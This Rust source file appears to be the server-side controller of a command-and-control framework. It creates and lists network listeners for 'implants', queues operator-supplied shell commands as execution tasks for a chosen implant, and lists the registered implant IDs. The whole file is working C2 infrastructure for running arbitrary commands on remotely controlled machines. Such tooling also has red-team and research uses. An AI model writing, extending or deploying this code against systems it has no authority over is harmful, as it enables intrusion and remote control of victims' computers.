use super::db;
use super::net;
use crate::share::{implantpb, operatorpb, Error};
use std::sync::Arc;
use tokio::sync::Mutex;

use operatorpb::listeners_request::ListenersCommand;
use operatorpb::ImplantsResponse;

pub struct Controller {
    db: Arc<Mutex<db::Db>>,
}

impl Controller {
    pub fn new(db: Arc<Mutex<db::Db>>) -> Controller {
        Controller { db }
    }

    pub async fn listenerctl(
        &self,
        request: operatorpb::ListenersRequest,
    ) -> Result<operatorpb::ListenersResponse, Error> {
        let req = request
            .listeners_command
            .ok_or_else(|| Error::ListenerStartErr("".to_string(), 0))?;

        let response = match req {
            ListenersCommand::NewListener(new_listener) => {
                // Create a new listener
                let ip = new_listener
                    .lhost
                    .parse()
                    .map_err(|_| Error::InvalidIP(new_listener.lhost.to_string()))?;
                let addr = std::net::SocketAddr::new(ip, new_listener.lport as u16);
                let listener = net::implant_server::Listener::new(addr, Arc::clone(&self.db))?;

                // Add the listener to the db
                self.db.lock().await.listeners.push(listener);

                operatorpb::ListenersResponse {
                    listeners_command: Some(
                        operatorpb::listeners_response::ListenersCommand::NewListener(
                            operatorpb::Empty {},
                        ),
                    ),
                }
            }

            // List existing listeners
            ListenersCommand::ListListeners(_) => {
                let listeners = self
                    .db
                    .lock()
                    .await
                    .listeners
                    .iter()
                    .map(|l| operatorpb::NewListener {
                        id: l.uuid.to_string(),
                        lhost: l.lhost.clone(),
                        lport: l.lport as u32,
                    })
                    .collect();

                operatorpb::ListenersResponse {
                    listeners_command: Some(
                        operatorpb::listeners_response::ListenersCommand::ListListeners(
                            operatorpb::RepeatedNewListeners {
                                new_listeners: listeners,
                            },
                        ),
                    ),
                }
            }
        };
        Ok(response)
    }

    pub async fn taskctl(
        &self,
        request: operatorpb::NewTaskRequest,
    ) -> Result<operatorpb::Empty, Error> {
        let task = implantpb::TaskResponse {
            task_id: uuid::Uuid::new_v4().to_string(),
            task_payload: Some(implantpb::task_response::TaskPayload::ExecTask(
                implantpb::ExecBody { cmd: request.cmd },
            )),
            task_type: implantpb::TaskType::ExecTask as i32,
        };

        self.db.lock().await.add_task(request.implantid, task);
        Ok(operatorpb::Empty {})
    }

    pub async fn implantctl(&self) -> Result<ImplantsResponse, Error> {
        let uuids = self.db.lock().await.list_implants().await?;
        let response = ImplantsResponse { implants: uuids };
        Ok(response)
    }
}
